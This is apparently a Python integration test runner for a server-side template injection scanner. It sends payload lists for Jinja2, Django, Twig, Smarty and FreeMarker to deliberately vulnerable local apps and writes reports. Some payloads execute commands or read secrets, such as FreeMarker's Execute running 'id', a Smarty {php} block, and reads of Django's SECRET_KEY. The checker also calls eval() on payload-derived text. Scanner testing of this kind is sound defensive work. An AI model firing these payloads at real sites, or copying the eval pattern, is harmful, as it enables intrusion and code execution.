#!/usr/bin/env python3
"""
Integration test runner for SSTI Scanner vulnerable applications.

This script coordinates testing across all vulnerable web applications,
providing comprehensive SSTI detection validation.
"""

import asyncio
import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Any, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime

from vulnerable_app_manager import VulnerableAppManager, VulnerableApp


@dataclass
class TestResult:
    """Test result data structure."""
    app_name: str
    engine: str
    endpoint: str
    payload: str
    method: str
    success: bool
    response_code: int
    response_snippet: str
    vulnerability_detected: bool
    confidence: str
    execution_time: float
    timestamp: str


@dataclass
class TestSuite:
    """Test suite configuration."""
    name: str
    description: str
    payloads: List[Dict[str, Any]]
    endpoints: List[str]
    methods: List[str]


class SSTIIntegrationTester:
    """Main integration tester for SSTI vulnerabilities."""
    
    def __init__(self, apps_directory: Path, output_directory: Path):
        self.apps_directory = apps_directory
        self.output_directory = output_directory
        self.app_manager = VulnerableAppManager(apps_directory)
        self.test_results: List[TestResult] = []
        
        # Ensure output directory exists
        self.output_directory.mkdir(parents=True, exist_ok=True)
    
    def _load_test_suites(self) -> Dict[str, TestSuite]:
        """Load test suites for different template engines."""
        
        return {
            'jinja2': TestSuite(
                name='Jinja2 SSTI Tests',
                description='Comprehensive Jinja2 template injection tests',
                payloads=[
                    {'payload': '{{7*7}}', 'expected': '49', 'confidence': 'high', 'type': 'math'},
                    {'payload': '{{config}}', 'expected': 'Config', 'confidence': 'medium', 'type': 'config'},
                    {'payload': '{{request}}', 'expected': 'Request', 'confidence': 'medium', 'type': 'request'},
                    {'payload': '{{self.__dict__}}', 'expected': 'dict', 'confidence': 'high', 'type': 'introspection'},
                    {'payload': "{{''.__class__.__mro__[1].__subclasses__()}}", 'expected': 'class', 'confidence': 'high', 'type': 'class_walk'},
                    {'payload': '{{config.items()}}', 'expected': 'dict_items', 'confidence': 'medium', 'type': 'config_access'},
                    {'payload': '{{request.environ}}', 'expected': 'environ', 'confidence': 'medium', 'type': 'environ'},
                    {'payload': '{{lipsum.__globals__}}', 'expected': 'globals', 'confidence': 'high', 'type': 'globals'},
                    {'payload': '{{cycler.__init__.__globals__}}', 'expected': 'globals', 'confidence': 'high', 'type': 'builtin_globals'},
                    {'payload': '{{joiner.__init__.__globals__}}', 'expected': 'globals', 'confidence': 'high', 'type': 'builtin_globals'}
                ],
                endpoints=['/search', '/profile', '/render', '/debug', '/api/evaluate'],
                methods=['GET', 'POST']
            ),
            
            'django': TestSuite(
                name='Django Templates SSTI Tests',
                description='Django template injection vulnerability tests',
                payloads=[
                    {'payload': '{{7|add:7}}', 'expected': '14', 'confidence': 'high', 'type': 'filter_math'},
                    {'payload': '{{settings}}', 'expected': 'Settings', 'confidence': 'medium', 'type': 'settings'},
                    {'payload': '{{debug}}', 'expected': 'True', 'confidence': 'low', 'type': 'debug'},
                    {'payload': '{{request.META}}', 'expected': 'META', 'confidence': 'medium', 'type': 'request_meta'},
                    {'payload': '{{settings.SECRET_KEY}}', 'expected': 'secret', 'confidence': 'high', 'type': 'secret_key'},
                    {'payload': '{{settings.DATABASES}}', 'expected': 'DATABASES', 'confidence': 'high', 'type': 'database_config'},
                    {'payload': '{{settings.DEBUG}}', 'expected': 'True', 'confidence': 'medium', 'type': 'debug_setting'},
                    {'payload': '{{perms}}', 'expected': 'perm', 'confidence': 'low', 'type': 'permissions'},
                    {'payload': '{{user}}', 'expected': 'User', 'confidence': 'low', 'type': 'user_object'}
                ],
                endpoints=['/search', '/filter', '/debug', '/include', '/context'],
                methods=['GET', 'POST']
            ),
            
            'twig': TestSuite(
                name='Twig SSTI Tests',
                description='Twig template injection vulnerability tests',
                payloads=[
                    {'payload': '{{7*7}}', 'expected': '49', 'confidence': 'high', 'type': 'math'},
                    {'payload': '{{dump()}}', 'expected': 'dump', 'confidence': 'medium', 'type': 'dump_function'},
                    {'payload': '{{_self}}', 'expected': 'Template', 'confidence': 'medium', 'type': 'self_reference'},
                    {'payload': '{{app}}', 'expected': 'Application', 'confidence': 'medium', 'type': 'app_object'},
                    {'payload': '{{_context}}', 'expected': 'context', 'confidence': 'medium', 'type': 'context_access'},
                    {'payload': '{{app.request}}', 'expected': 'Request', 'confidence': 'medium', 'type': 'request_object'},
                    {'payload': '{{app.session}}', 'expected': 'Session', 'confidence': 'medium', 'type': 'session_object'},
                    {'payload': '{{_self.getTemplateName()}}', 'expected': 'template', 'confidence': 'high', 'type': 'template_name'},
                    {'payload': '{{app.environment}}', 'expected': 'env', 'confidence': 'medium', 'type': 'environment'}
                ],
                endpoints=['/search', '/render', '/filter', '/include', '/globals'],
                methods=['GET', 'POST']
            ),
            
            'smarty': TestSuite(
                name='Smarty SSTI Tests',
                description='Smarty template injection vulnerability tests',
                payloads=[
                    {'payload': '{math equation="7*7"}', 'expected': '49', 'confidence': 'high', 'type': 'math_function'},
                    {'payload': '{php}echo "test";{/php}', 'expected': 'test', 'confidence': 'high', 'type': 'php_execution'},
                    {'payload': '{$smarty.server.HTTP_HOST}', 'expected': 'localhost', 'confidence': 'medium', 'type': 'server_vars'},
                    {'payload': '{$smarty.get}', 'expected': 'Array', 'confidence': 'medium', 'type': 'get_vars'},
                    {'payload': '{$smarty.post}', 'expected': 'Array', 'confidence': 'medium', 'type': 'post_vars'},
                    {'payload': '{$smarty.session}', 'expected': 'Array', 'confidence': 'medium', 'type': 'session_vars'},
                    {'payload': '{$smarty.cookies}', 'expected': 'Array', 'confidence': 'medium', 'type': 'cookie_vars'},
                    {'payload': '{eval var="7*7"}', 'expected': '49', 'confidence': 'high', 'type': 'eval_function'},
                    {'payload': '{math equation="x*y" x=7 y=7}', 'expected': '49', 'confidence': 'high', 'type': 'math_variables'}
                ],
                endpoints=['/search', '/math', '/php', '/server', '/custom'],
                methods=['GET', 'POST']
            ),
            
            'freemarker': TestSuite(
                name='FreeMarker SSTI Tests',
                description='FreeMarker template injection vulnerability tests',
                payloads=[
                    {'payload': '${7*7}', 'expected': '49', 'confidence': 'high', 'type': 'math'},
                    {'payload': '${Class.forName("java.lang.System")}', 'expected': 'class java.lang.System', 'confidence': 'high', 'type': 'class_access'},
                    {'payload': '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}', 'expected': 'uid', 'confidence': 'high', 'type': 'execute'},
                    {'payload': '${product.getClass()}', 'expected': 'class', 'confidence': 'medium', 'type': 'object_class'},
                    {'payload': '${product.getClass().forName("java.lang.Runtime")}', 'expected': 'Runtime', 'confidence': 'high', 'type': 'runtime_access'},
                    {'payload': '${.now}', 'expected': '20', 'confidence': 'low', 'type': 'builtin_now'},
                    {'payload': '${.current_template_name}', 'expected': 'template', 'confidence': 'low', 'type': 'template_name'},
                    {'payload': '<#assign obj=object.getClass().forName("java.lang.System").getProperty("java.version")>${obj}', 'expected': '1.', 'confidence': 'high', 'type': 'system_property'},
                    {'payload': '${object?new()}', 'expected': 'Object', 'confidence': 'medium', 'type': 'new_operator'}
                ],
                endpoints=['/search', '/render', '/debug', '/class', '/object'],
                methods=['GET', 'POST']
            )
        }
    
    async def _test_payload_on_endpoint(self, app: VulnerableApp, app_name: str, engine: str,
                                      endpoint: str, payload_data: Dict[str, Any], 
                                      method: str = 'GET') -> TestResult:
        """Test a specific payload on an endpoint."""
        
        payload = payload_data['payload']
        expected = payload_data.get('expected', '')
        confidence = payload_data.get('confidence', 'low')
        
        start_time = time.time()
        
        # Test the payload
        success, response, status_code = await app.test_endpoint(endpoint, payload, method)
        
        execution_time = time.time() - start_time
        
        # Check for vulnerability indicators
        vulnerability_detected = False
        response_snippet = response[:200] if response else ''
        
        if success and response:
            # Look for expected response patterns
            if expected and expected.lower() in response.lower():
                vulnerability_detected = True
            
            # Look for common SSTI indicators
            ssti_indicators = [
                'class ', 'function ', 'object ', 'method',
                'Template', 'Environment', 'Config', 'Settings',
                'Runtime', 'System', 'Process', 'File',
                'globals', 'locals', 'vars', 'dir(',
                'subclasses', '__mro__', '__bases__',
                'traceback', 'exception', 'error'
            ]
            
            for indicator in ssti_indicators:
                if indicator in response:
                    vulnerability_detected = True
                    break
            
            # Mathematical evaluation check
            if payload_data.get('type') == 'math':
                try:
                    if str(eval(payload.replace('{{', '').replace('}}', '').replace('${', '').replace('}', ''))) in response:
                        vulnerability_detected = True
                except:
                    pass
        
        return TestResult(
            app_name=app_name,
            engine=engine,
            endpoint=endpoint,
            payload=payload,
            method=method,
            success=success,
            response_code=status_code,
            response_snippet=response_snippet,
            vulnerability_detected=vulnerability_detected,
            confidence=confidence,
            execution_time=execution_time,
            timestamp=datetime.now().isoformat()
        )
    
    async def test_app(self, app_name: str) -> List[TestResult]:
        """Test a specific application with its test suite."""
        
        if app_name not in self.app_manager.apps:
            print(f"❌ Application {app_name} not found")
            return []
        
        app = self.app_manager.apps[app_name]
        config = self.app_manager.configs[app_name]
        
        # Get test suite for this engine
        test_suites = self._load_test_suites()
        
        if config.engine not in test_suites:
            print(f"❌ No test suite found for engine {config.engine}")
            return []
        
        test_suite = test_suites[config.engine]
        results = []
        
        print(f"\n🧪 Testing {app_name} ({config.engine})...")
        print(f"   Base URL: {config.base_url}")
        print(f"   Endpoints: {len(test_suite.endpoints)}")
        print(f"   Payloads: {len(test_suite.payloads)}")
        
        # Test each payload on each endpoint
        total_tests = len(test_suite.endpoints) * len(test_suite.payloads) * len(test_suite.methods)
        current_test = 0
        
        for endpoint in test_suite.endpoints:
            for payload_data in test_suite.payloads:
                for method in test_suite.methods:
                    current_test += 1
                    
                    print(f"   [{current_test}/{total_tests}] {method} {endpoint} - {payload_data['type']}")
                    
                    result = await self._test_payload_on_endpoint(
                        app, app_name, config.engine, endpoint, payload_data, method
                    )
                    
                    results.append(result)
                    
                    # Small delay between requests
                    await asyncio.sleep(0.1)
        
        # Summary for this app
        total = len(results)
        successful = sum(1 for r in results if r.success)
        vulnerabilities = sum(1 for r in results if r.vulnerability_detected)
        
        print(f"   ✅ {successful}/{total} requests successful")
        print(f"   🚨 {vulnerabilities}/{total} potential vulnerabilities detected")
        
        return results
    
    async def test_all_apps(self) -> Dict[str, List[TestResult]]:
        """Test all applications."""
        
        print("🚀 Starting comprehensive SSTI integration testing...")
        print(f"   Output directory: {self.output_directory}")
        
        # Start all applications
        print("\n📋 Starting vulnerable applications...")
        start_results = await self.app_manager.start_all()
        
        # Wait for all apps to be ready
        await asyncio.sleep(5)
        
        # Check health of all apps
        health_results = await self.app_manager.health_check_all()
        
        ready_apps = [name for name, healthy in health_results.items() if healthy]
        failed_apps = [name for name, healthy in health_results.items() if not healthy]
        
        if failed_apps:
            print(f"⚠️  Failed to start: {', '.join(failed_apps)}")
        
        print(f"✅ Ready applications: {', '.join(ready_apps)}")
        
        # Test each ready application
        all_results = {}
        
        for app_name in ready_apps:
            try:
                results = await self.test_app(app_name)
                all_results[app_name] = results
                self.test_results.extend(results)
            except Exception as e:
                print(f"❌ Error testing {app_name}: {e}")
                all_results[app_name] = []
        
        # Stop all applications
        print("\n🛑 Stopping applications...")
        await self.app_manager.stop_all()
        
        # Generate reports
        await self._generate_reports()
        
        return all_results
    
    async def _generate_reports(self):
        """Generate test reports."""
        
        print(f"\n📊 Generating test reports...")
        
        # JSON report
        json_report = {
            'summary': self._generate_summary(),
            'results': [asdict(result) for result in self.test_results],
            'timestamp': datetime.now().isoformat()
        }
        
        json_file = self.output_directory / 'integration_test_results.json'
        with open(json_file, 'w') as f:
            json.dump(json_report, f, indent=2)
        
        print(f"   📄 JSON report: {json_file}")
        
        # HTML report
        html_report = self._generate_html_report()
        html_file = self.output_directory / 'integration_test_report.html'
        with open(html_file, 'w') as f:
            f.write(html_report)
        
        print(f"   📄 HTML report: {html_file}")
        
        # CSV report
        csv_report = self._generate_csv_report()
        csv_file = self.output_directory / 'integration_test_results.csv'
        with open(csv_file, 'w') as f:
            f.write(csv_report)
        
        print(f"   📄 CSV report: {csv_file}")
    
    def _generate_summary(self) -> Dict[str, Any]:
        """Generate test summary statistics."""
        
        total_tests = len(self.test_results)
        successful_tests = sum(1 for r in self.test_results if r.success)
        vulnerabilities_detected = sum(1 for r in self.test_results if r.vulnerability_detected)
        
        # Group by engine
        engine_stats = {}
        for result in self.test_results:
            if result.engine not in engine_stats:
                engine_stats[result.engine] = {
                    'total': 0,
                    'successful': 0,
                    'vulnerabilities': 0
                }
            
            engine_stats[result.engine]['total'] += 1
            if result.success:
                engine_stats[result.engine]['successful'] += 1
            if result.vulnerability_detected:
                engine_stats[result.engine]['vulnerabilities'] += 1
        
        return {
            'total_tests': total_tests,
            'successful_tests': successful_tests,
            'vulnerabilities_detected': vulnerabilities_detected,
            'success_rate': round(successful_tests / total_tests * 100, 2) if total_tests > 0 else 0,
            'vulnerability_rate': round(vulnerabilities_detected / total_tests * 100, 2) if total_tests > 0 else 0,
            'engine_statistics': engine_stats
        }
    
    def _generate_html_report(self) -> str:
        """Generate HTML test report."""
        
        summary = self._generate_summary()
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SSTI Scanner Integration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .summary {{ background: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        .stats {{ display: flex; gap: 20px; }}
        .stat {{ background: white; padding: 10px; border-radius: 5px; text-align: center; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
        .success {{ color: green; }}
        .failure {{ color: red; }}
        .vulnerability {{ background-color: #ffcccc; }}
        .payload {{ font-family: monospace; background: #f8f8f8; padding: 2px 4px; }}
    </style>
</head>
<body>
    <h1>SSTI Scanner Integration Test Report</h1>
    
    <div class="summary">
        <h2>Test Summary</h2>
        <div class="stats">
            <div class="stat">
                <h3>{summary['total_tests']}</h3>
                <p>Total Tests</p>
            </div>
            <div class="stat">
                <h3>{summary['successful_tests']}</h3>
                <p>Successful Tests</p>
            </div>
            <div class="stat">
                <h3>{summary['vulnerabilities_detected']}</h3>
                <p>Vulnerabilities Detected</p>
            </div>
            <div class="stat">
                <h3>{summary['success_rate']}%</h3>
                <p>Success Rate</p>
            </div>
            <div class="stat">
                <h3>{summary['vulnerability_rate']}%</h3>
                <p>Vulnerability Rate</p>
            </div>
        </div>
    </div>
    
    <h2>Test Results</h2>
    <table>
        <thead>
            <tr>
                <th>App</th>
                <th>Engine</th>
                <th>Endpoint</th>
                <th>Method</th>
                <th>Payload</th>
                <th>Status</th>
                <th>Response Code</th>
                <th>Vulnerability</th>
                <th>Confidence</th>
                <th>Execution Time</th>
            </tr>
        </thead>
        <tbody>
"""
        
        for result in self.test_results:
            status_class = 'success' if result.success else 'failure'
            vuln_class = 'vulnerability' if result.vulnerability_detected else ''
            
            html += f"""
            <tr class="{vuln_class}">
                <td>{result.app_name}</td>
                <td>{result.engine}</td>
                <td>{result.endpoint}</td>
                <td>{result.method}</td>
                <td class="payload">{result.payload[:50]}{'...' if len(result.payload) > 50 else ''}</td>
                <td class="{status_class}">{'✅' if result.success else '❌'}</td>
                <td>{result.response_code}</td>
                <td>{'🚨' if result.vulnerability_detected else '✅'}</td>
                <td>{result.confidence}</td>
                <td>{result.execution_time:.3f}s</td>
            </tr>
"""
        
        html += """
        </tbody>
    </table>
</body>
</html>
"""
        
        return html
    
    def _generate_csv_report(self) -> str:
        """Generate CSV test report."""
        
        csv_lines = [
            'App Name,Engine,Endpoint,Method,Payload,Success,Response Code,Vulnerability Detected,Confidence,Execution Time,Timestamp'
        ]
        
        for result in self.test_results:
            csv_lines.append(
                f'"{result.app_name}","{result.engine}","{result.endpoint}","{result.method}",'
                f'"{result.payload}",{result.success},{result.response_code},{result.vulnerability_detected},'
                f'"{result.confidence}",{result.execution_time:.3f},"{result.timestamp}"'
            )
        
        return '\n'.join(csv_lines)


async def main():
    """Main entry point for integration testing."""
    
    # Setup paths
    script_dir = Path(__file__).parent
    apps_dir = script_dir / 'vulnerable_apps'
    output_dir = script_dir / 'test_results'
    
    print("🔍 SSTI Scanner Integration Test Suite")
    print("=" * 50)
    
    # Create tester
    tester = SSTIIntegrationTester(apps_dir, output_dir)
    
    # Run tests
    try:
        results = await tester.test_all_apps()
        
        print("\n" + "=" * 50)
        print("🎉 Integration testing completed!")
        
        # Print final summary
        summary = tester._generate_summary()
        print(f"\n📊 Final Results:")
        print(f"   Total tests: {summary['total_tests']}")
        print(f"   Successful: {summary['successful_tests']} ({summary['success_rate']}%)")
        print(f"   Vulnerabilities: {summary['vulnerabilities_detected']} ({summary['vulnerability_rate']}%)")
        
        print(f"\n📁 Reports generated in: {output_dir}")
        
    except KeyboardInterrupt:
        print("\n❌ Testing interrupted by user")
        await tester.app_manager.stop_all()
    except Exception as e:
        print(f"\n❌ Testing failed: {e}")
        await tester.app_manager.stop_all()


if __name__ == '__main__':
    asyncio.run(main())
